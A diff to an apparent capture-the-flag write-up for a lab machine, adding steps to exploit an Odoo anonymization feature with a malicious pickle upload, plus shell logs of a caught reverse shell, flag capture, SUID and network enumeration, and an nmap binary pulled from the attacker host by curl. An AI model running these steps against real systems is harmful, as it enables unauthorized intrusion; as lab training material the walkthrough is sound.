@@ -315,20 +315,36 @@ with open("exploit.pickle", "wb") as f:
 
 <p>
 
-- click <code>Settings</code><br<
-- search for <code>Database Anonymization</code><br>
-- click <code>Install</code><br>
+- click <code>Settings</code><br>
+- click x to remove Apps from the Search field<br>
+- search for <code>database</code><br>
+- click <code>Install</code> in  <code>Database Anonymization</code><br>
 - refresh<br>
 - click <code>Settings</code><br>
 - click <code>Anonymize database</code><br>
 - click <code>Anonymize Database</code><br>
+- you should get a message: Anonymization successful.<br>Donot forget to save the resulting file to a safe place because you will not be able to revert the anonymization without this file.<br>This file is also stored in the /var/lib/odoo directory. The absolute file path is: /var/lib/odoo/field_anonymization_main_1.pickle.<br>
+- clicked <code>Save><br>
+
+Anonymization successful.
+
+Donot forget to save the resulting file to a safe place because you will not be able to revert the anonymization without this file.
+
+This file is also stored in the /var/lib/odoo directory. The absolute file path is: /var/lib/odoo/field_anonymization_main_1.pickle.
+
 - refresh<br>
+- click <code>Anonymize Database</code><br>
 - click <code>Upload your file</code><br>
+- click Open
+- 
 - set up a listener in the same port considered in the payload<br>
 - click <code>Reverse the Database Anonymization</code></p>
 
 <br>
 <br>
+
+<img width="1258" height="293" alt="image" src="https://github.com/user-attachments/assets/7ed75da0-da88-4e4c-9109-aff94514e5ff" />
+
 
 <img width="1232" height="332" alt="image" src="https://github.com/user-attachments/assets/cf5734a4-0c99-4220-8cf4-c5cfd52da6c4" />
 
@@ -386,6 +402,26 @@ with open("exploit.pickle", "wb") as f:
 <img width="1252" height="399" alt="image" src="https://github.com/user-attachments/assets/036604b2-95c2-400e-90df-a69ed3842018" />
 
 
+
+
+<img width="664" height="393" alt="image" src="https://github.com/user-attachments/assets/38722396-06bc-4c28-ace4-a96da5147d2a" />
+
+
+
+root@ip-10-201-47-153:~/Obscure# nano exploit.py
+root@ip-10-201-47-153:~/Obscure# nano exploit.py
+root@ip-10-201-47-153:~/Obscure# nc -nlvp 1234
+Listening on 0.0.0.0 1234
+Connection received on 10.201.4.52 42798
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+odoo@b8a9bbf1f380:/$ SHELL=/bin/bash script -q /dev/null
+SHELL=/bin/bash script -q /dev/null
+odoo@b8a9bbf1f380:/$ 
+
+
+
+
 <br>
 <br>
 
@@ -397,6 +433,15 @@ SHELL=/bin/bash script -q /dev/null
 
 ```bash
 odoo@b8a9bbf1f380:/$ cd /var/lib/odoo
+
+odoo@b8a9bbf1f380:~$ ls -a
+ls -a
+.   .bash_history  field_anonymization_main_1.pickle  flag.txt
+..  addons	   filestore			      sessions
+odoo@b8a9bbf1f380:~$ 
+
+
+
 odoo@b8a9bbf1f380:~$ ls
 addons
 field_anonymization_main_1.pickle
@@ -405,6 +450,13 @@ flag.txt
 sessions
 odoo@b8a9bbf1f380:~$ cat flag.txt
 THM{1243b64a3a01a8732ccb96217f593520}
+
+
+
+getcap -r / 2>/dev/null
+
+
+
 odoo@b8a9bbf1f380:~$ find / -perm -u=s f 2>/dev/null
 /bin/mount
 /bin/umount
@@ -419,6 +471,23 @@ odoo@b8a9bbf1f380:~$ find / -perm -u=s f 2>/dev/null
 /usr/bin/passwd
 /ret
 ```
+
+
+odoo@b8a9bbf1f380:/tmp$ find / -perm -4000 -ls 2>/dev/null
+find / -perm -4000 -ls 2>/dev/null
+156001   40 -rwsr-xr-x   1 root     root        40000 Mar 29  2015 /bin/mount
+156039   28 -rwsr-xr-x   1 root     root        27416 Mar 29  2015 /bin/umount
+156006   44 -rwsr-xr-x   1 root     root        44104 Nov  8  2014 /bin/ping
+156007   44 -rwsr-xr-x   1 root     root        44552 Nov  8  2014 /bin/ping6
+156022   40 -rwsr-xr-x   1 root     root        40168 May 17  2017 /bin/su
+142767  456 -rwsr-xr-x   1 root     root       464904 Mar 25  2019 /usr/lib/openssh/ssh-keysign
+156958   40 -rwsr-xr-x   1 root     root        39912 May 17  2017 /usr/bin/newgrp
+156863   44 -rwsr-xr-x   1 root     root        44464 May 17  2017 /usr/bin/chsh
+156861   56 -rwsr-xr-x   1 root     root        53616 May 17  2017 /usr/bin/chfn
+156909   76 -rwsr-xr-x   1 root     root        75376 May 17  2017 /usr/bin/gpasswd
+156970   56 -rwsr-xr-x   1 root     root        54192 May 17  2017 /usr/bin/passwd
+ 10150   12 -rwsr-xr-x   1 root     root         8864 Jul 23  2022 /ret
+
 
 <br>
 
@@ -480,6 +549,54 @@ c7FgDFMEoa44S7BZIhxymHyGN7xgPQ6EJonUuMCfmP83KLRZrkI4FPI=
 ```
 
 <br>
+
+
+
+odoo@b8a9bbf1f380:/tmp$ getent hosts
+getent hosts
+127.0.0.1       localhost
+127.0.0.1       localhost ip6-localhost ip6-loopback
+172.17.0.2      db b5cc3d65e489 unkkuri-db
+172.17.0.3      b8a9bbf1f380
+
+
+odoo@b8a9bbf1f380:/tmp$ ss
+ss
+Netid  State      Recv-Q Send-Q   Local Address:Port       Peer Address:Port   
+tcp    ESTAB      0      0           172.17.0.3:60994        172.17.0.2:postgresql 
+tcp    ESTAB      0      0           172.17.0.3:60990        172.17.0.2:postgresql 
+tcp    ESTAB      0      0           172.17.0.3:60992        172.17.0.2:postgresql 
+tcp    ESTAB      0      0           172.17.0.3:42798     10.201.47.153:1234    
+tcp    ESTAB      0      0           172.17.0.3:8069      10.201.47.153:35918   
+tcp    ESTAB      0      0           172.17.0.3:60986        172.17.0.2:postgresql 
+
+
+
+
+
+odoo@b8a9bbf1f380:/tmp$ curl http://10.201.47.153:8000/nmap-x64.tar.gz -o nmap-x64.tar.gz
+<l http://10.201.47.153:8000/nmap-x64.tar.gz -o nmap-x64.tar.gz              
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 10.1M  100 10.1M    0     0   105M      0 --:--:-- --:--:-- --:--:--  106M
+odoo@b8a9bbf1f380:/tmp$ 
+
+
+
+odoo@b8a9bbf1f380:/tmp$ tar -xzf nmap-x64.tar.gz
+tar -xzf nmap-x64.tar.gz
+odoo@b8a9bbf1f380:/tmp$ 
+
+
+<p> 172.17.0.1 has port 4444 open</p>
+
+odoo@b8a9bbf1f380:/tmp$ ./nmap -Pn 172.17.0/24
+
+
+
+
+
+
 
 ```bash
 :~/Obscure# ssh -i id_rsa zeeshan@xx.xxx.xxx.xxx
